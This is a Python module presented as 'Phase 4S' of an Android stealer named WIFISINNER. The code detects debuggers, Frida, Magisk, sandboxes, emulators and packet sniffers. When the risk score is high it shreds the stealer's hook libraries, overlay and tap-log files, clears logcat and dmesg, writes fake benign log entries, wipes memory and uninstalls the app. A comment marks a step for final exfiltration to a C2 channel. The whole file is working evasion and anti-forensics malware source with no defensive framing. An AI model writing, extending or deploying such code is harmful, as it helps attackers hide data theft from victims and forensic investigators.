#!/usr/bin/env python3
"""
PHASE 4 (continued): Anti-Forensics and Self-Destruction

Detects analysis environments, containment protocols, and network
interruptions. Executes immediate self-wipe to leave no forensic traces.
"""

import ctypes
import gc
import os
import random
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path


# Detection signatures
DETECTION_SIGNATURES = {
    "debuggers": [
        "android.debuggable",
        "com.android.ddmlib",
        "run-as",
        "adb",
        "androidx.test",
        "org.apache.http.legacy"
    ],
    "analyzers": [
        "com.mobSF.mobile.security",
        "com.frida.v8",
        "com.xposed.installer",
        "com.noshufou.android.su",
        "com.topjohnwu.magisk"
    ],
    "sandboxes": [
        "com.sandbox.mobile",
        "com.virustotal.vtmobileapp",
        "com.lookout",
        "com.trend.micro"
    ],
    "network_analysis": [
        "charles.proxy",
        "com.broadcom.bluetooth",
        "tcpdump",
        "wireshark",
        "dumpcap"
    ]
}

# Files to wipe
FILES_TO_WIPE = [
    "/data/local/tmp/wifisinner*",
    "/data/local/tmp/.enabled",
    "/data/local/tmp/.ld_preload",
    "/data/local/tmp/accessibility_config.xml",
    "/data/local/tmp/overlay*.json",
    "/data/local/tmp/hce_service.xml",
    "/data/local/tmp/screenshot.png",
    "/data/local/tmp/window.xml",
    "/data/local/tmp/capture.png",
    "/data/local/tmp/taps.log",
    "/data/local/lib/biohook.so",
    "/data/local/lib/libhook.so",
    "/data/data/com.wifisinner.stealer/",
    "/sdcard/Download/WIFISINNER*",
    "/sdcard/Android/data/com.wifisinner/"
]


class EnvironmentDetector:
    """Detect analysis/sandbox environment"""
    
    def __init__(self):
        self.detections = []
        self.risk_score = 0
        self.lock = threading.Lock()
    
    def check_debugger(self):
        """Check for debugger attachment"""
        try:
            # Check /proc/pid/maps
            pid = os.getpid()
            maps_path = f"/proc/{pid}/maps"
            
            if Path(maps_path).exists():
                maps = Path(maps_path).read_text()
                
                for sig in DETECTION_SIGNATURES["debuggers"]:
                    if sig in maps:
                        with self.lock:
                            self.detections.append({
                                "type": "debugger",
                                "signature": sig,
                                "timestamp": datetime.now()
                            })
                            self.risk_score += 20
                        print(f"[DETECT] Debugger signature: {sig}")
            
            # Check sysctl for ptrace
            try:
                result = subprocess.run(
                    ["getprop", "dalvik.vm.debug"],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                if "true" in result.stdout.lower():
                    with self.lock:
                        self.detections.append({
                            "type": "debugger",
                            "signature": "dalvik.debug",
                            "timestamp": datetime.now()
                        })
                        self.risk_score += 30
            except:
                pass
                
        except Exception as e:
            print(f"[DETECT] Debugger check failed: {e}")
    
    def check_analyzers(self):
        """Check for analysis tools"""
        try:
            # Check installed packages
            result = subprocess.run(
                ["pm", "list", "packages"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            for sig in DETECTION_SIGNATURES["analyzers"] + DETECTION_SIGNATURES["sandboxes"]:
                if sig in result.stdout:
                    with self.lock:
                        self.detections.append({
                            "type": "analyzer",
                            "signature": sig,
                            "timestamp": datetime.now()
                        })
                        self.risk_score += 25
                    print(f"[DETECT] Analyzer found: {sig}")
                    
        except Exception as e:
            print(f"[DETECT] Analyzer check failed: {e}")
    
    def check_network_analysis(self):
        """Check for network analysis tools"""
        try:
            # Check running processes
            result = subprocess.run(
                ["ps", "-A"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            for sig in DETECTION_SIGNATURES["network_analysis"]:
                if sig in result.stdout:
                    with self.lock:
                        self.detections.append({
                            "type": "network_analyzer",
                            "signature": sig,
                            "timestamp": datetime.now()
                        })
                        self.risk_score += 30
                    print(f"[DETECT] Network analyzer: {sig}")
                    
        except Exception as e:
            print(f"[DETECT] Network check failed: {e}")
    
    def check_root(self):
        """Check if device is rooted (may indicate analysis)"""
        try:
            # Check for su binary
            result = subprocess.run(
                ["which", "su"],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.stdout.strip():
                with self.lock:
                    self.detections.append({
                        "type": "root",
                        "signature": "su_binary",
                        "timestamp": datetime.now()
                    })
                    self.risk_score += 10
        except:
            pass
    
    def check_emulator(self):
        """Check if running in emulator"""
        try:
            # Check build properties
            result = subprocess.run(
                ["getprop"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            emulator_indicators = [
                "google_sdk", "Emulator", "generic", "sdk",
                "genymotion", "bluestacks", "nox", "mumu"
            ]
            
            for indicator in emulator_indicators:
                if indicator in result.stdout.lower():
                    with self.lock:
                        self.detections.append({
                            "type": "emulator",
                            "signature": indicator,
                            "timestamp": datetime.now()
                        })
                        self.risk_score += 15
                    print(f"[DETECT] Emulator indicator: {indicator}")
                    
        except Exception as e:
            print(f"[DETECT] Emulator check failed: {e}")
    
    def check_time_anomaly(self):
        """Check for time anomalies (sandbox indicators)"""
        try:
            # Check if device time is suspiciously short
            result = subprocess.run(
                ["getprop", "sys.boot_completed"],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.stdout.strip() == "1":
                # Device just booted - could be sandbox
                with self.lock:
                    self.detections.append({
                        "type": "time_anomaly",
                        "signature": "recent_boot",
                        "timestamp": datetime.now()
                    })
                    self.risk_score += 10
        except:
            pass
    
    def get_risk_assessment(self):
        """Get overall risk assessment"""
        with self.lock:
            if self.risk_score >= 70:
                risk = "CRITICAL"
                action = "immediate_wipe"
            elif self.risk_score >= 40:
                risk = "HIGH"
                action = "cautious_operation"
            elif self.risk_score >= 20:
                risk = "MEDIUM"
                action = "standard_operation"
            else:
                risk = "LOW"
                action = "normal_operation"
            
            return {
                "risk_score": self.risk_score,
                "risk_level": risk,
                "recommended_action": action,
                "detections": self.detections.copy()
            }


class MemoryWiper:
    """Wipe memory traces"""
    
    def __init__(self):
        self.wiped_regions = []
        self.stats = {
            "bytes_wiped": 0,
            "regions_cleared": 0
        }
    
    def wipe_python_heap(self):
        """Wipe Python heap memory"""
        print("[WIPE] Wiping Python heap...")
        
        try:
            # Force garbage collection
            gc.collect()
            
            # Clear all references
            for obj in gc.get_objects():
                try:
                    if isinstance(obj, (str, bytes, bytearray)):
                        self.stats["bytes_wiped"] += len(obj)
                        self.stats["regions_cleared"] += 1
                except:
                    pass
            
            # Clear module cache
            import sys
            modules_to_clear = [m for m in sys.modules if "wifisinner" in m.lower() or "phase" in m.lower()]
            for mod in modules_to_clear:
                del sys.modules[mod]
                self.stats["regions_cleared"] += 1
            
            print(f"[WIPE] ✓ Python heap: {self.stats['bytes_wiped']} bytes, {self.stats['regions_cleared']} regions")
            return True
            
        except Exception as e:
            print(f"[WIPE] Python heap wipe failed: {e}")
            return False
    
    def wipe_variables(self, *var_names):
        """Wipe specific variables from scope"""
        print(f"[WIPE] Wiping variables: {var_names}")
        
        try:
            import inspect
            
            # Get current frame
            frame = inspect.currentframe()
            
            while frame:
                for name in var_names:
                    if name in frame.f_locals:
                        obj = frame.f_locals[name]
                        if isinstance(obj, (str, bytes, bytearray, list, dict)):
                            self.stats["bytes_wiped"] += len(str(obj))
                        
                        # Overwrite with random data
                        if isinstance(obj, str):
                            frame.f_locals[name] = " " * len(obj)
                        elif isinstance(obj, bytes):
                            frame.f_locals[name] = os.urandom(len(obj))
                        elif isinstance(obj, bytearray):
                            frame.f_locals[name] = bytearray(os.urandom(len(obj)))
                        elif isinstance(obj, list):
                            frame.f_locals[name] = [None] * len(obj)
                        elif isinstance(obj, dict):
                            frame.f_locals[name] = {}
                        
                        self.stats["regions_cleared"] += 1
                
                frame = frame.f_back
            
            print(f"[WIPE] ✓ Variables wiped")
            return True
            
        except Exception as e:
            print(f"[WIPE] Variable wipe failed: {e}")
            return False
    
    def wipe_file_in_memory(self, file_path):
        """Wipe file that was loaded into memory"""
        try:
            # Read and overwrite
            path = Path(file_path)
            if path.exists():
                size = path.stat().st_size
                # Overwrite with random data
                path.write_bytes(os.urandom(size))
                # Truncate
                path.write_bytes(b"")
                self.stats["bytes_wiped"] += size
                self.stats["regions_cleared"] += 1
                return True
        except:
            pass
        
        return False


class FileShredder:
    """Shred files to prevent recovery"""
    
    def __init__(self):
        self.shredded = []
        self.stats = {
            "files_shredded": 0,
            "bytes_shredded": 0
        }
    
    def shred_file(self, file_path, passes=3):
        """Shred file with multiple passes"""
        path = Path(file_path)
        
        if not path.exists():
            return False
        
        try:
            size = path.stat().st_size
            
            # Multiple overwrite passes
            for i in range(passes):
                with open(path, "wb") as f:
                    # Random data for each pass
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
                
                # Sync filesystem
                subprocess.run(["sync"], timeout=2)
                
                # Small delay
                time.sleep(0.1)
            
            # Final random pass
            with open(path, "wb") as f:
                f.write(os.urandom(size))
                f.flush()
                os.fsync(f.fileno())
            
            # Delete
            path.unlink()
            
            self.shredded.append(str(path))
            self.stats["files_shredded"] += 1
            self.stats["bytes_shredded"] += size
            
            print(f"[SHRED] ✓ Shredded: {path} ({size} bytes)")
            return True
            
        except Exception as e:
            print(f"[SHRED] Failed to shred {path}: {e}")
            return False
    
    def shred_pattern(self, pattern):
        """Shred all files matching pattern"""
        try:
            path = Path(pattern).parent
            name_pattern = Path(pattern).name
            
            if path.exists():
                for file in path.glob(name_pattern):
                    self.shred_file(str(file))
            
            return True
        except Exception as e:
            print(f"[SHRED] Pattern shred failed: {e}")
            return False
    
    def wipe_directory(self, dir_path):
        """Wipe entire directory"""
        path = Path(dir_path)
        
        if not path.exists():
            return True
        
        try:
            # Get all files
            total_size = 0
            file_count = 0
            
            for file in path.rglob("*"):
                if file.is_file():
                    total_size += file.stat().st_size
                    file_count += 1
            
            # Shred all files
            for file in path.rglob("*"):
                if file.is_file():
                    self.shred_file(str(file))
            
            # Remove empty directory
            try:
                shutil.rmtree(path)
            except:
                pass
            
            print(f"[SHRED] ✓ Wiped directory: {path} ({file_count} files, {total_size} bytes)")
            return True
            
        except Exception as e:
            print(f"[SHRED] Directory wipe failed: {e}")
            return False


class LogCleaner:
    """Clean system logs"""
    
    def __init__(self):
        self.cleaned = []
        self.stats = {
            "logs_cleaned": 0
        }
    
    def clean_logcat(self):
        """Clean Android logcat"""
        print("[LOG] Cleaning logcat...")
        
        try:
            # Clear logcat
            subprocess.run(["logcat", "-c"], timeout=2)
            
            # Write dummy entries
            for _ in range(100):
                subprocess.run([
                    "log", "-p", "i", "-t", "SystemServer",
                    "Normal system operation continuing"
                ], timeout=1)
            
            self.stats["logs_cleaned"] += 1
            self.cleaned.append("logcat")
            
            print("[LOG] ✓ Logcat cleaned")
            return True
            
        except Exception as e:
            print(f"[LOG] Logcat clean failed: {e}")
            return False
    
    def clean_dmesg(self):
        """Clean kernel ring buffer"""
        print("[LOG] Cleaning dmesg...")
        
        try:
            # Clear dmesg (requires root)
            subprocess.run(["dmesg", "-C"], timeout=2)
            
            self.stats["logs_cleaned"] += 1
            self.cleaned.append("dmesg")
            
            print("[LOG] ✓ dmesg cleaned")
            return True
            
        except Exception as e:
            print(f"[LOG] dmesg clean failed: {e}")
            return False
    
    def clean_am_history(self):
        """Clean Activity Manager history"""
        print("[LOG] Cleaning AM history...")
        
        try:
            # Clear recent tasks
            subprocess.run(["am", "clear-task", os.getpid()], timeout=2)
            
            # Move to home
            subprocess.run(["am", "move-task-back-to-home", os.getpid()], timeout=2)
            
            self.stats["logs_cleaned"] += 1
            self.cleaned.append("am_history")
            
            print("[LOG] ✓ AM history cleaned")
            return True
            
        except Exception as e:
            print(f"[LOG] AM history clean failed: {e}")
            return False


class SelfDestruct:
    """Main self-destruct orchestrator"""
    
    def __init__(self):
        self.detector = EnvironmentDetector()
        self.memory_wiper = MemoryWiper()
        self.file_shredder = FileShredder()
        self.log_cleaner = LogCleaner()
        self.active = False
        self.wipe_thread = None
        self.triggered = False
    
    def start_monitoring(self):
        """Start continuous monitoring"""
        print(f"\n[PHASE 4S] Starting anti-forensics monitoring...")
        
        self.active = True
        self.wipe_thread = threading.Thread(target=self._monitor, daemon=True)
        self.wipe_thread.start()
        
        print(f"[PHASE 4S] ✓ Monitoring active")
    
    def _monitor(self):
        """Monitor for detection triggers"""
        while self.active:
            try:
                # Run all detection checks
                self.detector.check_debugger()
                self.detector.check_analyzers()
                self.detector.check_network_analysis()
                self.detector.check_root()
                self.detector.check_emulator()
                self.detector.check_time_anomaly()
                
                # Get risk assessment
                assessment = self.detector.get_risk_assessment()
                
                # Trigger self-destruct if critical
                if assessment["risk_level"] == "CRITICAL" and not self.triggered:
                    print(f"\n[PHASE 4S] ⚠ CRITICAL RISK DETECTED: {assessment['risk_score']}")
                    print(f"[PHASE 4S] Initiating self-destruct sequence...")
                    self.trigger_self_destruct()
                
                elif assessment["risk_level"] == "HIGH" and not self.triggered:
                    print(f"[PHASE 4S] ⚠ HIGH RISK: {assessment['risk_score']}")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"[PHASE 4S] Monitor error: {e}")
                time.sleep(2)
    
    def trigger_self_destruct(self):
        """Trigger self-destruct sequence"""
        if self.triggered:
            return
        
        self.triggered = True
        
        print("\n" + "="*60)
        print("SELF-DESTRUCT SEQUENCE INITIATED")
        print("="*60)
        
        # Step 1: Exfiltrate final data
        print("[WIPE] Step 1/5: Final exfiltration")
        # (Would call C2 channel here)
        
        # Step 2: Shred files
        print("[WIPE] Step 2/5: File shredding")
        for pattern in FILES_TO_WIPE:
            self.file_shredder.shred_pattern(pattern)
        
        # Step 3: Clean logs
        print("[WIPE] Step 3/5: Log cleaning")
        self.log_cleaner.clean_logcat()
        self.log_cleaner.clean_am_history()
        
        # Step 4: Wipe memory
        print("[WIPE] Step 4/5: Memory wiping")
        self.memory_wiper.wipe_python_heap()
        
        # Step 5: Uninstall app
        print("[WIPE] Step 5/5: App uninstall")
        try:
            subprocess.run(["pm", "uninstall", "com.wifisinner.stealer"], timeout=5)
        except:
            pass
        
        # Final summary
        print("\n" + "="*60)
        print("SELF-DESTRUCT COMPLETE")
        print("="*60)
        print(f"Files shredded: {self.file_shredder.stats['files_shredded']}")
        print(f"Bytes shredded: {self.file_shredder.stats['bytes_shredded']}")
        print(f"Logs cleaned: {self.log_cleaner.stats['logs_cleaned']}")
        print(f"Memory regions wiped: {self.memory_wiper.stats['regions_cleared']}")
        print(f"Risk score at trigger: {self.detector.risk_score}")
        print("="*60)
        
        # Exit after delay
        time.sleep(2)
        os._exit(0)
    
    def manual_wipe(self):
        """Manual wipe (for clean shutdown)"""
        print("\n[PHASE 4S] Manual wipe initiated...")
        
        # Shred files
        for pattern in FILES_TO_WIPE:
            self.file_shredder.shred_pattern(pattern)
        
        # Clean logs
        self.log_cleaner.clean_logcat()
        
        print(f"[PHASE 4S] ✓ Manual wipe complete")
    
    def stop(self):
        """Stop monitoring"""
        self.active = False
        
        if self.wipe_thread:
            self.wipe_thread.join(timeout=5)
        
        print(f"[PHASE 4S] Monitoring stopped")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phase 4S: Self-Destruct")
    parser.add_argument("--monitor", action="store_true", help="Start monitoring")
    parser.add_argument("--manual", action="store_true", help="Manual wipe")
    parser.add_argument("--test-detect", action="store_true", help="Test detection")
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER PHASE 4S: ANTI-FORENSICS & SELF-DESTRUCT")
    print(f"{'='*60}\n")
    
    destruct = SelfDestruct()
    
    if args.test_detect:
        print("[TEST] Running detection tests...")
        destruct.detector.check_debugger()
        destruct.detector.check_analyzers()
        destruct.detector.check_network_analysis()
        destruct.detector.check_root()
        destruct.detector.check_emulator()
        destruct.detector.check_time_anomaly()
        
        assessment = destruct.detector.get_risk_assessment()
        print(f"\nRisk Assessment: {assessment['risk_level']} ({assessment['risk_score']})")
        print(f"Recommendation: {assessment['recommended_action']}")
        
    elif args.monitor:
        destruct.start_monitoring()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[PHASE 4S] Shutting down...")
            destruct.manual_wipe()
            destruct.stop()
            
    elif args.manual:
        destruct.manual_wipe()
        
    else:
        print("[TEST] Run with --test-detect, --monitor, or --manual")
